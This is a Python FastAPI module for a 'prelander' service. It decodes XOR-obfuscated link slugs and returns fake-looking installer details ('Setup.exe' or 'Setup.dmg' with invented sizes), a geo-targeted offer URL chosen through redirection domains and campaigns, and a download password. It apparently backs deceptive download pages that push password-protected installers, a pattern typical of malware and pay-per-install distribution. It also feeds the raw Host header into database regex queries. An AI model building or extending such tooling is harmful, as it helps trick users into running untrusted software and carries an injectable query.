"""
Prelander API — returns file details, offer URL, and password from landing pages / campaigns.
"""
from fastapi import APIRouter, Query, Depends, Request
from fastapi.responses import JSONResponse
from typing import Optional
from bson import ObjectId
import base64
from app.dependencies import get_db

_XOR_KEY = "mxp2026"


def _decode_slug(slug: str) -> Optional[dict]:
    """Decode an encrypted slug back to {os, offer_id, campaign_id, country_code}. Returns None if invalid."""
    try:
        # Add back padding
        padded = slug + "=" * (4 - len(slug) % 4) if len(slug) % 4 else slug
        xored = base64.urlsafe_b64decode(padded)
        raw = "".join(chr(b ^ ord(_XOR_KEY[i % len(_XOR_KEY)])) for i, b in enumerate(xored))
        if ":" not in raw:
            return None
        parts = raw.split(":")
        result = {"os": parts[0]}
        if len(parts) >= 3 and parts[2]:
            result["offer_id"] = parts[2]
        if len(parts) >= 4 and parts[3]:
            result["campaign_id"] = parts[3]
        if len(parts) >= 5 and parts[4]:
            result["country_code"] = parts[4]
        return result
    except Exception:
        return None

router = APIRouter(prefix="/prelander", tags=["Prelander"])


@router.get("/resolve/{slug}")
async def resolve_slug(slug: str, request: Request, db=Depends(get_db)):
    """Decode encrypted slug and return prelander data."""
    decoded = _decode_slug(slug)
    if not decoded:
        return JSONResponse(status_code=404, content={"detail": "Not found"})
    return await _get_prelander_data(
        request, decoded["os"], db,
        offer_id=decoded.get("offer_id"),
        campaign_id=decoded.get("campaign_id"),
        country_code=decoded.get("country_code"),
    )


@router.get("/data")
async def get_prelander_data(
    request: Request,
    os: str = Query("windows", description="OS type: windows or mac"),
    pub: Optional[str] = Query(None, description="Publisher ID"),
    db=Depends(get_db),
):
    """Return prelander data (legacy endpoint)."""
    return await _get_prelander_data(request, os, db)


async def _get_prelander_data(request: Request, os: str, db, offer_id: Optional[str] = None, campaign_id: Optional[str] = None, country_code: Optional[str] = None):
    """Core prelander data logic."""
    os_lower = os.lower()

    # Last-domain template override (when request hits a managed last domain)
    host = request.headers.get("host", "").split(":")[0].lower()
    if host:
        from app.services.domain_service import normalize_domain
        host = normalize_domain(host)
        last_domain = await db.redirection_domains.find_one({
            "domain_type": "last",
            "domain": host,
            "status": "active",
        })
        if last_domain:
            tpl = last_domain.get("template", "default")
            if tpl == "mac":
                os_lower = "mac"
            elif tpl == "windows":
                os_lower = "windows"

    # Defaults per OS
    if os_lower == "mac":
        file_name = "Setup"
        file_ext = ".dmg"
        file_size = "4.2 MB"
        file_version = "1.0.0"
        file_description = "macOS Application Installer"
    else:
        file_name = "Setup"
        file_ext = ".exe"
        file_size = "3.8 MB"
        file_version = "1.0.0"
        file_description = "Windows Application Installer"

    offer_url = None
    password = None
    campaign_name = None

    # --- GEO rule: country-specific URL takes highest priority ---
    if campaign_id and country_code:
        geo_rule = await db.geo_rules.find_one(
            {"campaign_id": campaign_id, "country_code": country_code},
            sort=[("priority", -1)],
        )
        if geo_rule and geo_rule.get("offer_url"):
            offer_url = geo_rule["offer_url"]
            password = geo_rule.get("password") or None

    # If offer_id is provided (from encrypted slug), use that specific offer
    if not offer_url and offer_id:
        try:
            offer = await db.offers.find_one({"_id": ObjectId(offer_id), "status": "active"})
            if offer:
                offer_url = offer.get("offer_url")
                # Use offer password only — don't fall back to campaign password
                password = offer.get("password") or None
                # Get campaign name
                if offer.get("campaign_id"):
                    try:
                        campaign = await db.campaigns.find_one({"_id": ObjectId(offer["campaign_id"])})
                        if campaign:
                            campaign_name = campaign.get("name")
                            # Only use campaign password if offer has no password field at all
                            if password is None and "password" not in offer:
                                password = campaign.get("password")
                    except Exception:
                        pass
        except Exception:
            pass

    # Get campaign name if we have campaign_id but haven't resolved it yet
    if not campaign_name and campaign_id:
        try:
            campaign = await db.campaigns.find_one({"_id": ObjectId(campaign_id)})
            if campaign:
                campaign_name = campaign.get("name")
                if password is None:
                    password = campaign.get("password")
        except Exception:
            pass

    # Fallback: find campaign and offer by domain/OS if no offer_id or offer not found
    if not offer_url:
        campaign = None

        # Get the host domain to match landing pages
        host = request.headers.get("host", "").split(":")[0].lower()

        # 1. Try landing page by domain match
        if host:
            landing_page = await db.landing_pages.find_one({
                "status": "active",
                "lander_url": {"$regex": host, "$options": "i"},
            })
            if landing_page and landing_page.get("campaign_id"):
                try:
                    campaign = await db.campaigns.find_one({"_id": ObjectId(landing_page["campaign_id"])})
                    if not campaign:
                        campaign = await db.campaigns.find_one({"_id": landing_page["campaign_id"]})
                except Exception:
                    pass

        # 2. Try OS-targeted campaign
        if not campaign:
            device_os = "windows" if os_lower == "windows" else "mac"
            campaign = await db.campaigns.find_one({
                "status": "active",
                "device_os": {"$regex": f"^{device_os}$", "$options": "i"},
            })

        # 3. Try global campaign
        if not campaign:
            campaign = await db.campaigns.find_one({
                "status": "active",
                "device_os": {"$regex": "^global$", "$options": "i"},
            })

        # 4. Any active campaign as fallback
        if not campaign:
            campaign = await db.campaigns.find_one({"status": "active"})

        if campaign:
            campaign_name = campaign.get("name")
            offer_url = campaign.get("default_offer_url") or campaign.get("offer_url") or campaign.get("url")
            password = campaign.get("password")

    # 5. Final fallback
    if not offer_url:
        offer_url = "https://example.com"

    return {
        "success": True,
        "file_name": file_name,
        "file_ext": file_ext,
        "file_size": file_size,
        "file_version": file_version,
        "file_description": file_description,
        "offer_url": offer_url,
        "password": password,
        "campaign_name": campaign_name,
        "os": os_lower,
    }
